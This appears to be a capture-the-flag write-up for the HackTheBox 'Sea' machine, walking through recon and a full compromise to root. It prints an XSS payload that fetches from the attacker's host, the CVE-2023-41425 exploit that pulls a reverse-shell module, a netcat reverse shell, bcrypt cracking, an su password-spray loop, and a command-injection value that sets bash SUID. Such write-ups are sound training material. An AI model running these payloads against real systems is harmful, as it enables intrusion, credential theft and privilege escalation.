---
render_with_liquid: false
title: HackTheBox Writeup  Sea
date: 2024-10-02 14:51:06 +1400
tags: [hackthebox, nmap, linux, feroxbuster, osint, reconnaissance, wondercms, cms, php, open-redirect, xss, xss-reflected, cve-2023-41425, discover-secrets, haiti, hashcat, password-spraying, port-forwarding, credentias-stuffing, directory-traversal, command-injection]
---




# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea]
└─$ pt init '10.10.11.28 sea.htb'
+---------+--------+-------------+---------+
| PROFILE | STATUS |     IP      | DOMAIN  |
+---------+--------+-------------+---------+
| sea     | on     | 10.10.11.28 | sea.htb |
+---------+--------+-------------+---------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Wed Oct  2 14:51:04 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.10.11.28
Nmap scan report for 10.10.11.28
Host is up, received user-set (0.18s latency).
Scanned at 2024-10-02 14:51:06 CST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Oct  2 14:51:19 2024 -- 1 IP address (1 host up) scanned in 15.54 seconds
```


## 80 - HTTP : Bikes competition


### Info

```ruby
http://10.10.11.28 [200] [Sea - Home] [Apache/2.4.41 (Ubuntu)] [93894162e673fe387c325d283319c712ba21700e] [Apache HTTP Server:2.4.41,Bootstrap:3.3.7,PHP,Ubuntu,jQuery,jQuery CDN]
```

![](/assets/obsidian/029480bb17995b8f51ba99adb927c0f8.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -k --auto-tune -A -u "http://$(pt get rhost):80" -o ferox_80.txt
```

```bash
301      GET        7l       20w      231c http://sea.htb/plugins => http://sea.htb/plugins/
301      GET        7l       20w      228c http://sea.htb/data => http://sea.htb/data/
301      GET        7l       20w      230c http://sea.htb/themes => http://sea.htb/themes/
301      GET        7l       20w      232c http://sea.htb/messages => http://sea.htb/messages/
404      GET        0l        0w     3341c http://sea.htb/sms_gateway
[...]
```

# User Flag
---

## Shell as www-data


### 80 - Osint : Identify web application

- Discovered domain name `sea.htb`, add to hosts

![](/assets/obsidian/1acefc9c8bae5eef083ded3c2f6564d6.png)

- `velik71-new-logotip.png` is a good unique signature to find related sources form the internet

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea]
└─$ cat httpx/urls.txt | cariddi -rua -info -s -e -ext 4 -sr -intensive
                 _     _     _ _
                (_)   | |   | (_)
   ___ __ _ _ __ _  __| | __| |_
  / __/ _` | '__| |/ _` |/ _` | |
 | (_| (_| | |  | | (_| | (_| | |
  \___\__,_|_|  |_|\__,_|\__,_|_| v1.3.2

 > github.com/edoardottt/cariddi
 > edoardoottavianelli.it
========================================
http://sea.htb:80
http://sea.htb:80/home
http://sea.htb:80/
http://sea.htb:80/themes/bike/css/style.css
http://sea.htb:80/how-to-participate
http://sea.htb/contact.php
http://sea.htb:80/themes/bike/img/velik71-new-logotip.png
[ HTML comment ] <!-- Admin CSS --> in http://sea.htb:80
[ HTML comment ] <!-- Theme CSS --> in http://sea.htb:80
```

- Google : `velik71-new-logotip.png`

> https://www.wondercms.com/community/viewtopic.php?t=830

- It's could be a theme for **WonderCMS**

![](/assets/obsidian/7f8f0e8ba330d5073f08db165e0afab8.png)

### 80 - Contact form : Open redirect & XSS

> http://sea.htb/contact.php

- After putting a URL in `Website` field and submit the form, a bot user will click on it, makes it vulnerable to **open redirect**

![](/assets/obsidian/cc40869e7fe43f073e83a9bb7a564d06.png)

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ simplehttpserver -listen 0.0.0.0:80 -verbose

   _____ _                 __     __  __________________
  / ___/(_)___ ___  ____  / /__  / / / /_  __/_  __/ __ \________  ______   _____  _____
  \__ \/ / __ -__ \/ __ \/ / _ \/ /_/ / / /   / / / /_/ / ___/ _ \/ ___/ | / / _ \/ ___/
 ___/ / / / / / / / /_/ / /  __/ __  / / /   / / / ____(__  )  __/ /   | |/ /  __/ /
/____/_/_/ /_/ /_/ .___/_/\___/_/ /_/ /_/   /_/ /_/   /____/\___/_/    |___/\___/_/
                /_/                                                       - v0.0.6

                projectdiscovery.io

Serving /home/kali/www on http://0.0.0.0:80/

[2024-10-03 16:13:28]
Remote Address: 10.10.11.28:32822
GET / HTTP/1.1
Host: 10.10.14.75
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
If-Modified-Since: Thu, 03 Oct 2024 08:06:20 GMT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36
```

- It's vulnerable to **XSS** (The code in the admin dashboard might used `window.location = <TARGET_URL>`)

```bash
javascript:fetch("http://10.10.14.75/c/")
```

![](/assets/obsidian/b0ab0f2445f6785b9bc2056ebd791aba.png)

```bash
[2024-10-03 17:29:43]
Remote Address: 10.10.11.28:40624
GET /c/ HTTP/1.1
Host: 10.10.14.75
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Origin: null
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36
```

### 80 - WonderCMS : Identify version

> https://github.com/search?q=repo%3AWonderCMS%2Fwondercms%20version&type=code

Search `version` in the repository to get the structure of where version info was stored

![](/assets/obsidian/7f6e0eb2fd35b24b0c7ec574046d18c9.png)

- Version : `3.2.0`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea]
└─$ curl http://sea.htb:80/themes/bike/wcms-modules.json
{
    "version": 1,
    "themes": {
        "bike": {
            "name": "Bike",
            "repo": "https://github.com/robiso/bike/tree/master",
            "zip": "https://github.com/robiso/bike/archive/master.zip",
            "summary": "Animated bike theme, providing more interaction to your visitors.",
            "version": "3.2.0",
            "image": "https://raw.githubusercontent.com/robiso/bike/master/preview.jpg"
        }
    }
} 
```


### 80 - WonderCMS 3.2.0 : XSS to RCE (CVE-2023-41425)

- Google : `wondercms 3.2.0 exploit`

> POC - https://github.com/prodigiousMind/CVE-2023-41425

> Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 allows a remote attacker to execute arbitrary code via a crafted script uploaded to the installModule component.
{: .prompt-info }

```bash
git clone https://github.com/prodigiousMind/CVE-2023-41425
cd CVE-2023-41425
```

The exploit will create a javascript that installs reverse shell module from remote repo

![](/assets/obsidian/a999fed47d5a35eb2d2a96705267e247.png)

Since HTB machines do not have access to WAN, I will host the reverse shell module on my web server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea/exploit/CVE-2023-41425]
└─$ wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
--2024-10-02 17:47:05--  https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
Resolving github.com (github.com)... 20.27.177.113
Connecting to github.com (github.com)|20.27.177.113|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://codeload.github.com/prodigiousMind/revshell/zip/refs/heads/main [following]
--2024-10-02 17:47:05--  https://codeload.github.com/prodigiousMind/revshell/zip/refs/heads/main
Resolving codeload.github.com (codeload.github.com)... 20.27.177.114
Connecting to codeload.github.com (codeload.github.com)|20.27.177.114|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/zip]
Saving to: ‘main.zip’

main.zip                      [ <=>                                  ]   2.62K  --.-KB/s    in 0s

2024-10-02 17:47:06 (47.1 MB/s) - ‘main.zip’ saved [2680]
```

Replace the remote URL for the module to my web server URL (Using `sed -e 's/[]\/$*.^[]/\\&/g'` to escape string)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea/exploit/CVE-2023-41425]
└─$ sed -i "s/$(echo https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip | sed -e 's/[]\/$*.^[]/\\&/g')/$(echo http://10.10.14.75:8000/main.zip | sed -e 's/[]\/$*.^[]/\\&/g')/g" exploit.py
```

Start exploit and revshell listener

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea/exploit/CVE-2023-41425]
└─$ python exploit.py http://sea.htb/wondercms/loginURL 10.10.14.75 1111
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 1111
----------------------------

send the below link to admin:

----------------------------
http://sea.htb/wondercms/index.php?page=loginURL?"></form><script+src="http://10.10.14.75:8000/xss.js"></script><form+action="
----------------------------


starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea/exploit/CVE-2023-41425]
└─$ rlwrap nc -lvnp 1111
listening on [any] 1111 ...
```

Submit the form with the payload inside `Website` field then wait for any authenticated users to click on

![](/assets/obsidian/76eb83879ecbff81d8b8925e4afaf1b5.png)

- Successful result

```bash
10.10.11.28 - - [02/Oct/2024 18:36:30] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [02/Oct/2024 18:36:35] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [02/Oct/2024 18:36:35] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [02/Oct/2024 18:36:36] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [02/Oct/2024 18:36:36] "GET /main.zip HTTP/1.1" 200 -
```

The reverse shell didn't trigger for some reason, trigger it manually

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea/exploit/CVE-2023-41425]
└─$ curl 'http://sea.htb:80/themes/revshell-main/rev.php?lhost=10.10.14.75&lport=1111'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea/exploit/CVE-2023-41425]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.11.28] 51056
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 17:54:10 up 25 min,  0 users,  load average: 0.51, 0.61, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ /usr/bin/script -qc /bin/bash /dev/null
www-data@sea:/$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Sea/exploit/CVE-2023-41425]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@sea:/$ stty rows 50 columns 209
www-data@sea:/$
```


## From www-data to amay


### Enumeration

- 2 regular users on the machine

```bash
amay@sea:~$ for u in $(cat /etc/passwd | grep sh$ | cut -d":" -f1 2>/dev/null);do id $u;done 2>/dev/null | sort -unt '=' -k2
uid=0(root) gid=0(root) groups=0(root)
uid=1000(amay) gid=1000(amay) groups=1000(amay)
uid=1001(geo) gid=1001(geo) groups=1001(geo),33(www-data)
```

```bash
amay@sea:~$ ls -latrh ~ /opt /var/www /etc/nginx/sites-enabled/ /etc/apache2/sites-enabled/ 2>/dev/null
/opt:
total 12K
drwxr-xr-x 19 root root 4.0K Feb 21  2024 ..
drwxr-xr-x  3 root root 4.0K Feb 21  2024 google
drwxr-xr-x  3 root root 4.0K Feb 21  2024 .

/etc/apache2/sites-enabled/:
total 8.0K
lrwxrwxrwx 1 root root   27 Feb 21  2024 sea.conf -> ../sites-available/sea.conf
drwxr-xr-x 2 root root 4.0K Feb 22  2024 .
drwxr-xr-x 8 root root 4.0K Aug  1 12:30 ..

/home/amay:
total 32K
-rw-r--r-- 1 amay amay  807 Feb 25  2020 .profile
-rw-r--r-- 1 amay amay 3.7K Feb 25  2020 .bashrc
-rw-r--r-- 1 amay amay  220 Feb 25  2020 .bash_logout
drwx------ 2 amay amay 4.0K Feb 21  2024 .ssh
drwxr-xr-x 4 root root 4.0K Jul 30 12:58 ..
lrwxrwxrwx 1 root root    9 Aug  1 12:12 .bash_history -> /dev/null
drwx------ 2 amay amay 4.0K Aug  1 12:22 .cache
drwxr-xr-x 4 amay amay 4.0K Aug  1 12:22 .
-rw-r----- 1 root amay   33 Oct  2 18:56 user.txt

/var/www:
total 16K
drwxr-xr-x 14 root     root     4.0K Feb 21  2024 ..
drwxr-xr-x  6 www-data www-data 4.0K Feb 22  2024 sea
drwxr-xr-x  2 root     root     4.0K Jul 17 18:58 html
drwxr-xr-x  4 root     root     4.0K Aug  1 12:28 .
```

### Crack password hash from WonderCMS config

```bash
www-data@sea:/$ cd /var/www/sea/
www-data@sea:/var/www/sea$ find . -type f
./contact.php
./.htaccess
./index.php
./data/database.js
[...]
```

```bash
www-data@sea:/var/www/sea$ cat data/database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
[...]
```

Remove the escape characters from the hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea]
└─$ echo $(printf '%s\n' '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q' | sed -e 's/\\//g') > loot/database.hash
```

It's a `bcrypt` hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea]
└─$ cat loot/database.hash | haiti -
bcrypt [HC: 3200] [JtR: bcrypt]
Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]
Woltlab Burning Board 4.x
```

Crack the hash

```powershell
PS XXX> hashcat.exe H:\VM-Share\Kali\database.hash H:\VM-Share\Kali\rockyou.txt -m 3200
```

```powershell
PS XXX> hashcat.exe H:\VM-Share\Kali\database.hash H:\VM-Share\Kali\rockyou.txt -m 3200 --show
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
```

### Password spray

```bash
www-data@sea:/var/www/sea$ PASS='mychemicalromance'; for USER in $(cat /etc/passwd|grep sh$|awk -F: '{print $1}'); do (x=$(echo $PASS | su $USER -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 3632
[2] 3633
[3] 3635
www-data@sea:/var/www/sea$ Password: Password: Password: [+] amay
```

```bash
www-data@sea:/var/www/sea$ su - amay
Password:mychemicalromance
amay@sea:~$ id
uid=1000(amay) gid=1000(amay) groups=1000(amay)
amay@sea:~$ cat user.txt
69ce88d1fc0789d07b727e7d21151f12
```


# Root Flag
---

## From amay to root


### 8080 - Monitoring Web APP : Directory traversal & Command injection

Check ports listening on local

```bash
amay@sea:/tmp$ ss -ltnp | awk '$4 !~ /0.0.0.0|::/'
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*
LISTEN  0        4096           127.0.0.1:8080           0.0.0.0:*
LISTEN  0        10             127.0.0.1:42833          0.0.0.0:*
```

Port `8080` requires authentication

```bash
amay@sea:/tmp$  curl 127.0.0.1:8080
Unauthorized access
```

Local port forward it to kali machine

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sea]
└─$ cssh $(pt get rhost) amay 'mychemicalromance' -L 8081:127.0.0.1:8080 -N
```

> http://127.0.0.1:8081/

The credential for `amay` worked

![](/assets/obsidian/c907faf8e48eced5bbe1842329ea59bf.png)

![](/assets/obsidian/4847f03ec5307dade46c20eba43382fe.png)

The `Analyze Log File` function uses `log_file` to get the file path, which causes **directory traversal**

![](/assets/obsidian/322a0c6b9f765e162bb552934705a1e7.png)

I'm able to read `/etc/passwd`, but only the content near the`Suspicious pattern` will show up

![](/assets/obsidian/09af6ae12674e5e75725d2e3a72dd5f2.png)

I can't read root's ssh private key without triggering `Suspicious pattern` detection

![](/assets/obsidian/5d63cd82017a3a519cb4286ba08b3920.png)

The `log_file` parameter is vulnerable to **command injection**

![](/assets/obsidian/c69e351864fd6a2960a40e8262416216.png)

Give bash SETUID

```bash
/root/.ssh/id_rsa; chmod +s /bin/bash #
```

![](/assets/obsidian/1ec2fecb525eb7c6961ce6f869be76e7.png)

Get shell as root

```bash
amay@sea:~$ bash -p
bash-5.0# id
uid=1000(amay) gid=1000(amay) euid=0(root) egid=0(root) groups=0(root),1000(amay)
bash-5.0# $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
bash-5.0# id
uid=0(root) gid=1000(amay) egid=0(root) groups=0(root),1000(amay)
bash-5.0# chmod -s /bin/bash
bash-5.0# cat /root/root.txt
75887d432f02d972294bc09050068948
```

# Additional
---
